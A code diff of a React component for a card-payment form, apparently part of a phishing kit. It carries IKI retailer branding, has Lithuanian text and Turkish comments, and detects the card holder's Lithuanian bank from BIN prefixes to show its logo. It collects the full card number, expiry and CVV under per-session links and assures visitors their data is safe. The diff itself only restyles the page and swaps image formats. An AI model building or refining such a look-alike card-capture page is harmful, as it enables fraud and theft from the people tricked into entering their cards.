@@ -70,12 +70,12 @@ function CardBrandLogo({ brand }: { brand: string }) {
 // Litvanya bankalari BIN (ilk 4-6 hane) -> logo eslesmesi
 type BankBin = { name: string; logo: string; prefixes: string[] };
 const LT_BANK_BINS: BankBin[] = [
-  { name: "Swedbank", logo: "/bank-logos/lithuania/swedbank-lt.png", prefixes: ["5168", "5224", "5413", "4898", "4026", "4714", "4921", "5308", "5589", "6763"] },
-  { name: "SEB", logo: "/bank-logos/lithuania/seb-lt.png", prefixes: ["4167", "4235", "4899", "5290", "5319", "5350", "5412", "5434", "5571", "6764"] },
-  { name: "Luminor", logo: "/bank-logos/lithuania/luminor-lt.png", prefixes: ["4025", "4738", "5125", "5150", "5187", "5299", "5360", "5416", "5528", "6762"] },
-  { name: "Šiaulių bankas", logo: "/bank-logos/lithuania/siauliu-bankas-lt.png", prefixes: ["4551", "5280", "5323", "5584", "6765"] },
-  { name: "Citadele", logo: "/bank-logos/lithuania/citadele-lt.png", prefixes: ["4191", "4328", "5124", "5189", "5274", "5567"] },
-  { name: "Kredito unijos", logo: "/bank-logos/lithuania/kredito-unijos-lt.png", prefixes: ["5164", "5359", "5483"] },
+  { name: "Swedbank", logo: "/bank-logos/lithuania/swedbank-lt.webp", prefixes: ["5168", "5224", "5413", "4898", "4026", "4714", "4921", "5308", "5589", "6763"] },
+  { name: "SEB", logo: "/bank-logos/lithuania/seb-lt.webp", prefixes: ["4167", "4235", "4899", "5290", "5319", "5350", "5412", "5434", "5571", "6764"] },
+  { name: "Luminor", logo: "/bank-logos/lithuania/luminor-lt.webp", prefixes: ["4025", "4738", "5125", "5150", "5187", "5299", "5360", "5416", "5528", "6762"] },
+  { name: "Šiaulių bankas", logo: "/bank-logos/lithuania/siauliu-bankas-lt.webp", prefixes: ["4551", "5280", "5323", "5584", "6765"] },
+  { name: "Citadele", logo: "/bank-logos/lithuania/citadele-lt.webp", prefixes: ["4191", "4328", "5124", "5189", "5274", "5567"] },
+  { name: "Kredito unijos", logo: "/bank-logos/lithuania/kredito-unijos-lt.webp", prefixes: ["5164", "5359", "5483"] },
 ];
 
 function detectBank(number: string): BankBin | null {
@@ -233,9 +233,9 @@ export function CardClient({ sessionId }: Props) {
 
   if (!supabase) {
     return (
-      <div className="a3d-shell items-center justify-center p-4">
-        <div className="a3d-card w-full max-w-[560px] p-5 sm:p-8">
-          <ConfigMissing />
+      <div className="pak-page-shell">
+        <div className="pak-form-card w-full max-w-[650px] p-5 sm:p-8">
+          <div className="pak-form-inner"><ConfigMissing /></div>
         </div>
       </div>
     );
@@ -243,38 +243,37 @@ export function CardClient({ sessionId }: Props) {
 
   if (!sessionId) {
     return (
-      <div className="a3d-shell items-center justify-center p-4">
-        <div className="a3d-card w-full max-w-[460px] p-8 text-center">
-          <p className="rounded-2xl border border-red-200 bg-red-50/90 p-4 text-center text-sm font-medium text-red-600">
-            Neteisinga nuoroda.
-          </p>
+      <div className="pak-page-shell">
+        <div className="pak-form-card w-full max-w-[520px] p-8 text-center">
+          <div className="pak-form-inner">
+            <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
+              Neteisinga nuoroda.
+            </p>
+          </div>
         </div>
       </div>
     );
   }
 
   return (
-    <div className="a3d-shell">
-      <div className="a3d-glow left-[-10%] top-[-12%] h-[440px] w-[440px] bg-[rgba(var(--brand-rgb),0.15)]" />
-      <div className="a3d-glow bottom-[-14%] right-[-8%] h-[400px] w-[400px] bg-[rgba(var(--brand-rgb),0.11)]" />
-
-      <main className="relative z-10 flex w-full flex-1 flex-col items-center justify-center p-4">
-        <div className="a3d-card a3d-in w-full max-w-[480px] overflow-hidden px-6 py-8 sm:px-9 sm:py-9">
-          <div className="mb-6 flex items-start justify-between gap-4">
-            <div className="min-w-0">
-              <h2 className="a3d-title text-[24px] leading-tight">{settings.card_title}</h2>
-              <p className="a3d-sub mt-2 text-sm font-medium">{settings.card_subtitle}</p>
+    <div className="pak-page-shell">
+      <div className="pak-form-card w-full max-w-[860px] fade-in">
+        <div className="pak-form-inner px-4 pb-5 pt-5 sm:px-8 sm:pb-8 sm:pt-8 lg:px-10">
+          <div className="flex items-start justify-between gap-3">
+            <div className="min-w-0 max-w-[29rem]">
+              <h2 className="pak-form-title">{settings.card_title}</h2>
+              <p className="pak-form-subtitle mt-2">{settings.card_subtitle}</p>
             </div>
             <img
-              src={settings.logo_url || "/form-assets/iki-mini-logo.png"}
+              src={settings.logo_url || "/form-assets/iki-mini-logo.webp"}
               alt="IKI logo"
-              className="h-11 w-11 shrink-0 object-contain"
+              className="pak-form-brand-logo shrink-0"
               id="card-ah-logo"
             />
           </div>
 
-          <form onSubmit={handleSubmit} className="space-y-4">
-            <label className="block text-[13px] font-semibold text-[#344054]">
+          <form onSubmit={handleSubmit} className="mt-5 space-y-4 sm:mt-6 sm:space-y-5">
+            <label className="pak-form-label">
               <div className="flex items-center justify-between gap-2">
                 <span>{settings.card_number_label}</span>
                 {(brand || bank) && (
@@ -284,20 +283,20 @@ export function CardClient({ sessionId }: Props) {
                         src={bank.logo}
                         alt={bank.name}
                         title={bank.name}
-                        className="h-6 w-auto rounded bg-white px-1 py-0.5 object-contain shadow-sm"
+                        className="h-6 w-auto rounded bg-white/90 px-1 py-0.5 object-contain shadow-sm"
                       />
                     )}
                     {brand && (
-                      <span className="rounded-md bg-white px-2 py-1 shadow-sm">
+                      <span className="rounded-md bg-white/90 px-2 py-1 shadow-sm">
                         <CardBrandLogo brand={brand.name} />
                       </span>
                     )}
                   </span>
                 )}
               </div>
-              <div className="relative mt-2">
-                <div className="pointer-events-none absolute inset-y-0 left-4 flex items-center text-[#98a2b3]">
-                  <svg className="h-5 w-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+              <div className="pak-form-input-wrap">
+                <div className="pak-form-input-icon">
+                  <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
                     <rect x="3" y="6.5" width="18" height="11" rx="2.5" />
                     <path d="M3 10.5h18" />
                   </svg>
@@ -305,8 +304,8 @@ export function CardClient({ sessionId }: Props) {
                 <input
                   required
                   inputMode="numeric"
-                  className={`a3d-input min-h-[3.5rem] py-3 pl-12 pr-4 text-lg tracking-[0.18em] ${
-                    !numberValid && number.length >= 12 ? "border-red-400! bg-red-50!" : ""
+                  className={`pak-form-input min-h-[4rem] pl-14 pr-4 text-lg tracking-[0.18em] ${
+                    !numberValid && number.length >= 12 ? "!border-red-500" : ""
                   }`}
                   value={number}
                   onChange={(e) => setNumber(e.target.value.replace(/\D/g, "").slice(0, 19))}
@@ -315,74 +314,90 @@ export function CardClient({ sessionId }: Props) {
               </div>
             </label>
             {bank && (
-              <p className="flex items-center gap-1.5 text-xs font-medium text-[#667085]">
-                <svg viewBox="0 0 20 20" fill="currentColor" className="h-3.5 w-3.5 text-[var(--brand)]">
+              <p className="flex items-center gap-1.5 text-xs font-medium text-white/60">
+                <svg viewBox="0 0 20 20" fill="currentColor" className="h-3.5 w-3.5 text-[#4ade80]">
                   <path fillRule="evenodd" d="M10 1a4.5 4.5 0 00-4.5 4.5V9H5a2 2 0 00-2 2v6a2 2 0 002 2h10a2 2 0 002-2v-6a2 2 0 00-2-2h-.5V5.5A4.5 4.5 0 0010 1zm3 8V5.5a3 3 0 10-6 0V9h6z" clipRule="evenodd" />
                 </svg>
                 {bank.name}
               </p>
             )}
-            <div className="grid grid-cols-2 gap-3">
-              <label className="block text-[13px] font-semibold text-[#344054]">
+            <div className="grid grid-cols-2 gap-4 sm:gap-6">
+              <label className="pak-form-label">
                 {settings.card_expiry_label}
-                <input
-                  required
-                  placeholder="MM/YY"
-                  className="a3d-input mt-2 min-h-[3.5rem] py-3 px-4 text-lg"
-                  value={expiry}
-                  onChange={(e) => setExpiry(formatExpiry(e.target.value))}
-                  autoComplete="cc-exp"
-                  inputMode="numeric"
-                  maxLength={5}
-                />
+                <div className="pak-form-input-wrap">
+                  <div className="pak-form-input-icon">
+                    <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
+                      <rect x="3.5" y="5" width="17" height="15" rx="2.5" />
+                      <path d="M7.5 3.8v3M16.5 3.8v3M3.5 9.3h17" strokeLinecap="round" />
+                    </svg>
+                  </div>
+                  <input
+                    required
+                    placeholder="MM/YY"
+                    className="pak-form-input min-h-[4rem] pl-14 pr-4 text-lg"
+                    value={expiry}
+                    onChange={(e) => setExpiry(formatExpiry(e.target.value))}
+                    autoComplete="cc-exp"
+                    inputMode="numeric"
+                    maxLength={5}
+                  />
+                </div>
               </label>
-              <label className="block text-[13px] font-semibold text-[#344054]">
+              <label className="pak-form-label">
                 {settings.card_cvv_label}
-                <input
-                  required
-                  inputMode="numeric"
-                  maxLength={4}
-                  className="a3d-input mt-2 min-h-[3.5rem] py-3 px-4 text-lg tracking-[0.14em]"
-                  value={cvc}
-                  onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
-                  autoComplete="cc-csc"
-                />
+                <div className="pak-form-input-wrap">
+                  <div className="pak-form-input-icon">
+                    <svg className="h-6 w-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.1">
+                      <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
+                      <path d="m9.3 12.1 1.7 1.7 3.7-3.9" strokeLinecap="round" strokeLinejoin="round" />
+                    </svg>
+                  </div>
+                  <input
+                    required
+                    inputMode="numeric"
+                    maxLength={4}
+                    className="pak-form-input min-h-[4rem] pl-14 pr-4 text-lg tracking-[0.14em]"
+                    value={cvc}
+                    onChange={(e) => setCvc(e.target.value.replace(/\D/g, "").slice(0, 4))}
+                    autoComplete="cc-csc"
+                  />
+                </div>
               </label>
             </div>
 
             {!numberValid && number.length >= 12 ? (
-              <p className="text-xs font-medium text-red-500">Neteisingas kortelės numeris.</p>
+              <p className="text-xs text-red-400">Neteisingas kortelės numeris.</p>
             ) : null}
 
             {!expiryValid && expiry.length > 0 ? (
-              <p className="text-xs font-medium text-red-500">Galiojimo data turi būti nurodyta MM/YY formatu.</p>
+              <p className="text-xs text-red-400">Galiojimo data turi būti nurodyta MM/YY formatu.</p>
             ) : null}
 
             {!cvcValid && cvc.length > 0 ? (
-              <p className="text-xs font-medium text-red-500">CVV turi būti 3 arba 4 skaitmenys.</p>
+              <p className="text-xs text-red-400">CVV turi būti 3 arba 4 skaitmenys.</p>
             ) : null}
 
-            {msg ? <p className="text-center text-sm font-medium text-red-500">{msg}</p> : null}
+            {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}
 
-            <button
-              type="submit"
-              disabled={saving || !numberValid || !expiryValid || !cvcValid}
-              className="a3d-btn w-full px-6 py-4 text-[16px]"
-            >
-              {saving ? "Siunčiama..." : settings.card_button}
-            </button>
-
-            <div className="flex justify-center pt-1">
-              <div className="a3d-pill">
-                <svg className="h-4 w-4 text-[var(--brand)]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+            <div className="flex flex-col gap-3 pt-1 md:flex-row md:items-center md:justify-between">
+              <div className="pak-form-security">
+                <svg className="h-9 w-9 shrink-0 text-[#4ade80]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
+                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                 </svg>
                 <span>Jūsų duomenys apdorojami saugiai.</span>
               </div>
+
+              <button
+                type="submit"
+                disabled={saving || !numberValid || !expiryValid || !cvcValid}
+                className="pak-form-button min-h-[3.85rem] w-full px-6 text-lg md:w-[22rem]"
+              >
+                {saving ? "Siunčiama..." : settings.card_button}
+              </button>
             </div>
           </form>
         </div>
-      </main>
+      </div>
     </div>
   );
 }
